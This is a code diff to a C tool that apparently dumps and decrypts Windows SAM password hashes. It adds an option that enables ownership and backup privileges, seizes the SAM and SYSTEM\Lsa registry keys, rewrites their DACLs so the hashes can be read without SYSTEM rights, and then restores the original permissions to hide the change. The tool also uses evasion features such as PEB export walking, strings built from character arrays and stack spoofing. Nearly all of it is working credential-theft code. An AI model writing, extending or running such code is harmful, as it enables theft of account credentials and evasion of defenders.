@@ -50,6 +50,15 @@ myNtQueryValueKey pMyNtQueryValueKey;
 myNtEnumerateValueKey pMyNtEnumerateValueKey;
 myNtClose pMyNtClose;
 myRtlInitUnicodeString pMyRtlInitUnicodeString;
+myNtOpenKeyEx pMyNtOpenKeyEx;
+myRtlAdjustPrivilege pMyRtlAdjustPrivilege;
+myNtQuerySecurityObject pMyNtQuerySecurityObject;
+myNtSetSecurityObject pMyNtSetSecurityObject;
+myRtlCreateSecurityDescriptor pMyRtlCreateSecurityDescriptor;
+myRtlSetDaclSecurityDescriptor pMyRtlSetDaclSecurityDescriptor;
+myRtlSetOwnerSecurityDescriptor pMyRtlSetOwnerSecurityDescriptor;
+myRtlCreateAcl pMyRtlCreateAcl;
+myRtlAddAccessAllowedAceEx pMyRtlAddAccessAllowedAceEx;
 
 BOOL gDebugEnabled = FALSE;
 
@@ -475,6 +484,201 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 	return;
 }
 
+static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE save, PSECURITY_DESCRIPTOR newDescriptor) {
+	HANDLE key;
+	OBJECT_ATTRIBUTES attributes;
+	UNICODE_STRING UnicodeRegPath;
+	ULONG lengthBuff = MAX_SECURITY_LENGTH;
+	DWORD ret;
+
+	DebugPrintf("Granting Administrators read access to registry key\n");
+	DebugPrintWideString("Registry key to grant read access", RegPath);
+
+	wcscpy_s(save->regPath, MAX_KEY_LENGTH, RegPath);
+	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
+	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	// Original owner + DACL are saved first. SeBackupPrivilege grants read access through backup semantics even when the DACL denies it.
+	ret = pMyNtOpenKeyEx(&key, READ_CONTROL, &attributes, REG_OPTION_BACKUP_RESTORE);
+	DebugPrintf("NtOpenKeyEx(backup/restore read) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	save->sdLength = lengthBuff;
+	ret = pMyNtQuerySecurityObject(key, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)save->sd, lengthBuff, &save->sdLength);
+	DebugPrintf("NtQuerySecurityObject returned 0x%08lX; original security descriptor saved: %lu bytes\n", ret, save->sdLength);
+	DebugPrintHexPreview("Original security descriptor preview", (const BYTE*)save->sd, save->sdLength, 32);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	pMyNtClose(key);
+
+	// SeTakeOwnershipPrivilege allows taking ownership of the key even when the DACL denies WRITE_OWNER to Administrators.
+	ret = pMyNtOpenKey(&key, WRITE_OWNER, &attributes);
+	DebugPrintf("NtOpenKey(key, WRITE_OWNER) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyNtSetSecurityObject(key, OWNER_SECURITY_INFORMATION, newDescriptor);
+	DebugPrintf("NtSetSecurityObject(key, OWNER) returned 0x%08lX; Administrators group now owns the key\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	pMyNtClose(key);
+
+	// Ownership in the Administrators group grants the implicit READ_CONTROL + WRITE_DAC rights needed to swap the DACL => the new DACL inherits into every subkey the dump reads.
+	ret = pMyNtOpenKey(&key, READ_CONTROL | WRITE_DAC, &attributes);
+	DebugPrintf("NtOpenKey(key, READ_CONTROL | WRITE_DAC) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyNtSetSecurityObject(key, DACL_SECURITY_INFORMATION, newDescriptor);
+	DebugPrintf("NtSetSecurityObject(key, DACL) returned 0x%08lX; Administrators group now holds read access\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	pMyNtClose(key);
+}
+
+static void restoreRegistryKeyAccess(PDACLSAVE save) {
+	HANDLE key;
+	OBJECT_ATTRIBUTES attributes;
+	UNICODE_STRING UnicodeRegPath;
+	DWORD ret;
+
+	DebugPrintWideString("Restoring registry key security descriptor", save->regPath);
+
+	pMyRtlInitUnicodeString(&UnicodeRegPath, save->regPath);
+	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	// While we still own the key, the implicit WRITE_DAC right lets us put the original ACEs back.
+	ret = pMyNtOpenKey(&key, READ_CONTROL | WRITE_DAC, &attributes);
+	DebugPrintf("NtOpenKey(key, READ_CONTROL | WRITE_DAC) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyNtSetSecurityObject(key, DACL_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)save->sd);
+	DebugPrintf("NtSetSecurityObject(key, DACL) returned 0x%08lX; original ACEs restored\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	pMyNtClose(key);
+
+	// Original owner restored last. SeTakeOwnershipPrivilege allows WRITE_OWNER even with the original DACL back in place.
+	pMyRtlInitUnicodeString(&UnicodeRegPath, save->regPath);
+	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	ret = pMyNtOpenKey(&key, WRITE_OWNER, &attributes);
+	DebugPrintf("NtOpenKey(key, WRITE_OWNER) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyNtSetSecurityObject(key, OWNER_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)save->sd);
+	DebugPrintf("NtSetSecurityObject(key, OWNER) returned 0x%08lX; original owner restored\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	pMyNtClose(key);
+}
+
+void grantRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave) {
+	ULONG administratorSid[4] = {};
+	ULONG newAcl[8] = {};
+	SECURITY_DESCRIPTOR newDescriptor = {};
+	BOOLEAN wasEnabled;
+	ULONG privileges[3] = { SE_TAKE_OWNERSHIP_PRIVILEGE, SE_RESTORE_PRIVILEGE, SE_BACKUP_PRIVILEGE };
+	PISID sid = (PISID)administratorSid;
+
+	DWORD ret;
+
+	DebugPrintf("Preparing DACL write so SAM and SYSTEM material can be read without SYSTEM rights\n");
+
+	// Administrators well-known SID (S-1-5-32-544) built by hand.
+	sid->Revision = 1;
+	sid->SubAuthorityCount = 2;
+	sid->IdentifierAuthority.Value[5] = 5;
+	sid->SubAuthority[0] = SECURITY_BUILTIN_DOMAIN_RID;
+	sid->SubAuthority[1] = DOMAIN_ALIAS_RID_ADMINS;
+	DebugPrintf("Trustee for the granted ACE built: Administrators group (S-1-5-32-544)\n");
+
+	for (ULONG i = 0; i < 3; i++) {
+		ret = pMyRtlAdjustPrivilege(privileges[i], TRUE, FALSE, &wasEnabled);
+		DebugPrintf("RtlAdjustPrivilege(%lu) returned 0x%08lX\n", privileges[i], ret);
+
+		if (!NT_SUCCESS(ret)) {
+			exit(ret);
+		}
+	}
+
+	// New owner + DACL: Administrators get KEY_READ and the ACE is inherited by every subkey the dump reads.
+	ret = pMyRtlCreateSecurityDescriptor(&newDescriptor, SECURITY_DESCRIPTOR_REVISION);
+	DebugPrintf("RtlCreateSecurityDescriptor returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyRtlCreateAcl(&newAcl, sizeof(newAcl), ACL_REVISION);
+	DebugPrintf("RtlCreateAcl returned 0x%08lX; ACL size: %lu bytes\n", ret, (ULONG)sizeof(newAcl));
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyRtlAddAccessAllowedAceEx(&newAcl, ACL_REVISION, CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE, KEY_READ, (PSID)administratorSid);
+	DebugPrintf("RtlAddAccessAllowedAceEx(KEY_READ, CONTAINER | OBJECT inherit) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyRtlSetDaclSecurityDescriptor(&newDescriptor, TRUE, (PACL)newAcl, FALSE);
+	DebugPrintf("RtlSetDaclSecurityDescriptor returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	ret = pMyRtlSetOwnerSecurityDescriptor(&newDescriptor, (PSID)administratorSid, FALSE);
+	DebugPrintf("RtlSetOwnerSecurityDescriptor returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	WCHAR RegPathSAM[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\0' };
+	WCHAR RegPathLsa[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\0' };
+
+	grantRegistryKeyDacl(RegPathSAM, samSave, &newDescriptor);
+	grantRegistryKeyDacl(RegPathLsa, systemSave, &newDescriptor);
+}
+
+void restoreRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave) {
+	DebugPrintf("Restoring original registry key security descriptors\n");
+	restoreRegistryKeyAccess(samSave);
+	restoreRegistryKeyAccess(systemSave);
+}
+
 
 void decryptSAM(PSAM samRegEntries[], int entries) {
 	CHAR strMagic1[] = { '!','@','#','$','%','^','&','*','(',')','q','w','e','r','t','y','U','I','O','P','A','z','x','c','v','b','n','m','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q',')','(','*','@','&','%', '\0' };
@@ -883,6 +1087,7 @@ int main(int argc, char** argv) {
 	BOOL useRegistryFlag = FALSE;
 	BOOL debugFlag = FALSE;
 	BOOL proxyNTCallsFlag = FALSE;
+	BOOL daclWriteFlag = FALSE;
 
 	CHAR helpOptionShort[] = "-h";
 	CHAR helpOptionLong[] = "--help";
@@ -894,6 +1099,8 @@ int main(int argc, char** argv) {
 	CHAR debugOptionLong[] = "--debug";
 	CHAR stackSpoofOptionShort[] = "-cc";
 	CHAR stackSpoofOptionLong[] = "--customCallback";
+	CHAR daclOptionShort[] = "-dacl";
+	CHAR daclOptionLong[] = "--dacl-write";
 
 	if (argc == 1) {
 		printf("Usage: %s [options]\n", argv[0]);
@@ -901,6 +1108,7 @@ int main(int argc, char** argv) {
 		printf("  %s, %s  Show this help message\n", helpOptionShort, helpOptionLong);
 		printf("  %s, %s\tUse shadow snapshot method\n", ssOptionShort, ssOptionLong);
 		printf("  %s, %s\t\tUse registry method\n", registryOptionShort, registryOptionLong);
+		printf("  %s, %s\tModify SAM and SYSTEM registry keys DACL to read them without SYSTEM rights (use with %s)\n", daclOptionShort, daclOptionLong, registryOptionShort);
 		printf("  %s, %s\t\tEnable debug mode\n", debugOptionShort, debugOptionLong);
 		printf("  %s, %s\tUse custom callback mechanism (Stack Spoofing)\n", stackSpoofOptionShort, stackSpoofOptionLong);
 	}
@@ -914,6 +1122,7 @@ int main(int argc, char** argv) {
 			printf("  %s, %s  Show this help message\n", helpOptionShort, helpOptionLong);
 			printf("  %s, %s\tUse shadow snapshot method\n", ssOptionShort, ssOptionLong);
 			printf("  %s, %s\t\tUse registry method\n", registryOptionShort, registryOptionLong);
+			printf("  %s, %s\tModify SAM and SYSTEM registry keys DACL to read them without SYSTEM rights (use with %s)\n", daclOptionShort, daclOptionLong, registryOptionShort);
 			printf("  %s, %s\t\tEnable debug mode\n", debugOptionShort, debugOptionLong);
 			printf("  %s, %s\tUse custom callback mechanism (Stack Spoofing)\n", stackSpoofOptionShort, stackSpoofOptionLong);
 		}
@@ -922,6 +1131,10 @@ int main(int argc, char** argv) {
 		}
 		else if (strncmp(currentArg, registryOptionShort, strlen(registryOptionShort)) == 0 || strncmp(currentArg, registryOptionLong, strlen(registryOptionLong)) == 0) {
 			useRegistryFlag = TRUE;
+		}
+		// The -dacl option is checked before -d because -dacl starts with the -d prefix.
+		else if (strncmp(currentArg, daclOptionShort, strlen(daclOptionShort)) == 0 || strncmp(currentArg, daclOptionLong, strlen(daclOptionLong)) == 0) {
+			daclWriteFlag = TRUE;
 		}
 		else if (strncmp(currentArg, debugOptionShort, strlen(debugOptionShort)) == 0 || strncmp(currentArg, debugOptionLong, strlen(debugOptionLong)) == 0) {
 			debugFlag = TRUE;
@@ -933,10 +1146,11 @@ int main(int argc, char** argv) {
 
 	gDebugEnabled = debugFlag;
 	DebugPrintf("Debug mode enabled\n");
-	DebugPrintf("Parsed options: registry=%s, shadowSnapshot=%s, customCallback=%s\n",
+	DebugPrintf("Parsed options: registry=%s, shadowSnapshot=%s, customCallback=%s, daclWrite=%s\n",
 		useRegistryFlag ? "true" : "false",
 		useShadowSnapshotFlag ? "true" : "false",
-		proxyNTCallsFlag ? "true" : "false");
+		proxyNTCallsFlag ? "true" : "false",
+		daclWriteFlag ? "true" : "false");
 
 	if (proxyNTCallsFlag) {
 		DebugPrintf("Using custom callback proxy functions for NT calls\n");
@@ -967,6 +1181,27 @@ int main(int argc, char** argv) {
 		pMyRtlInitUnicodeString = (myRtlInitUnicodeString)auxPMyRtlInitUnicodeString;
 	}
 
+	DebugPrintf("Resolving registry DACL handling functions by walking PEB export tables\n");
+	FARPROC auxPMyNtOpenKeyEx = myGetProcAddress(ntdlldll_RFDT, NtOpenKeyEx_RFDT);
+	FARPROC auxPMyRtlAdjustPrivilege = myGetProcAddress(ntdlldll_RFDT, RtlAdjustPrivilege_RFDT);
+	FARPROC auxPMyNtQuerySecurityObject = myGetProcAddress(ntdlldll_RFDT, NtQuerySecurityObject_RFDT);
+	FARPROC auxPMyNtSetSecurityObject = myGetProcAddress(ntdlldll_RFDT, NtSetSecurityObject_RFDT);
+	FARPROC auxPMyRtlCreateSecurityDescriptor = myGetProcAddress(ntdlldll_RFDT, RtlCreateSecurityDescriptor_RFDT);
+	FARPROC auxPMyRtlSetDaclSecurityDescriptor = myGetProcAddress(ntdlldll_RFDT, RtlSetDaclSecurityDescriptor_RFDT);
+	FARPROC auxPMyRtlSetOwnerSecurityDescriptor = myGetProcAddress(ntdlldll_RFDT, RtlSetOwnerSecurityDescriptor_RFDT);
+	FARPROC auxPMyRtlCreateAcl = myGetProcAddress(ntdlldll_RFDT, RtlCreateAcl_RFDT);
+	FARPROC auxPMyRtlAddAccessAllowedAceEx = myGetProcAddress(ntdlldll_RFDT, RtlAddAccessAllowedAceEx_RFDT);
+
+	pMyNtOpenKeyEx = (myNtOpenKeyEx)auxPMyNtOpenKeyEx;
+	pMyRtlAdjustPrivilege = (myRtlAdjustPrivilege)auxPMyRtlAdjustPrivilege;
+	pMyNtQuerySecurityObject = (myNtQuerySecurityObject)auxPMyNtQuerySecurityObject;
+	pMyNtSetSecurityObject = (myNtSetSecurityObject)auxPMyNtSetSecurityObject;
+	pMyRtlCreateSecurityDescriptor = (myRtlCreateSecurityDescriptor)auxPMyRtlCreateSecurityDescriptor;
+	pMyRtlSetDaclSecurityDescriptor = (myRtlSetDaclSecurityDescriptor)auxPMyRtlSetDaclSecurityDescriptor;
+	pMyRtlSetOwnerSecurityDescriptor = (myRtlSetOwnerSecurityDescriptor)auxPMyRtlSetOwnerSecurityDescriptor;
+	pMyRtlCreateAcl = (myRtlCreateAcl)auxPMyRtlCreateAcl;
+	pMyRtlAddAccessAllowedAceEx = (myRtlAddAccessAllowedAceEx)auxPMyRtlAddAccessAllowedAceEx;
+
 	DebugPrintf("NtOpenKey pointer: %p\n", (PVOID)pMyNtOpenKey);
 	DebugPrintf("NtQueryKey pointer: %p\n", (PVOID)pMyNtQueryKey);
 	DebugPrintf("NtEnumerateKey pointer: %p\n", (PVOID)pMyNtEnumerateKey);
@@ -974,10 +1209,28 @@ int main(int argc, char** argv) {
 	DebugPrintf("NtEnumerateValueKey pointer: %p\n", (PVOID)pMyNtEnumerateValueKey);
 	DebugPrintf("NtClose pointer: %p\n", (PVOID)pMyNtClose);
 	DebugPrintf("RtlInitUnicodeString pointer: %p\n", (PVOID)pMyRtlInitUnicodeString);
+	DebugPrintf("NtOpenKeyEx pointer: %p\n", (PVOID)pMyNtOpenKeyEx);
+	DebugPrintf("RtlAdjustPrivilege pointer: %p\n", (PVOID)pMyRtlAdjustPrivilege);
+	DebugPrintf("NtQuerySecurityObject pointer: %p\n", (PVOID)pMyNtQuerySecurityObject);
+	DebugPrintf("NtSetSecurityObject pointer: %p\n", (PVOID)pMyNtSetSecurityObject);
+	DebugPrintf("RtlCreateSecurityDescriptor pointer: %p\n", (PVOID)pMyRtlCreateSecurityDescriptor);
+	DebugPrintf("RtlSetDaclSecurityDescriptor pointer: %p\n", (PVOID)pMyRtlSetDaclSecurityDescriptor);
+	DebugPrintf("RtlSetOwnerSecurityDescriptor pointer: %p\n", (PVOID)pMyRtlSetOwnerSecurityDescriptor);
+	DebugPrintf("RtlCreateAcl pointer: %p\n", (PVOID)pMyRtlCreateAcl);
+	DebugPrintf("RtlAddAccessAllowedAceEx pointer: %p\n", (PVOID)pMyRtlAddAccessAllowedAceEx);
 
 
 	if (useRegistryFlag) {
 		DebugPrintf("Running live registry SAM extraction method\n");
+
+		DACLSAVE samSave = {};
+		DACLSAVE systemSave = {};
+
+		if (daclWriteFlag) {
+			DebugPrintf("Running live registry SAM extraction method without SYSTEM rights (DACL write)\n");
+			grantRegistryAccess(&samSave, &systemSave);
+		}
+
 		ULONG size;
 		PSAM sam[MAX_SAM_ENTRIES] = {};
 
@@ -986,6 +1239,10 @@ int main(int argc, char** argv) {
 
 		getSAM(sam, &size);
 		DebugPrintf("Live registry collection returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));
+
+		if (daclWriteFlag) {
+			restoreRegistryAccess(&samSave, &systemSave);
+		}
 
 		decryptSAM(sam, size / sizeof(SAM));
 	}
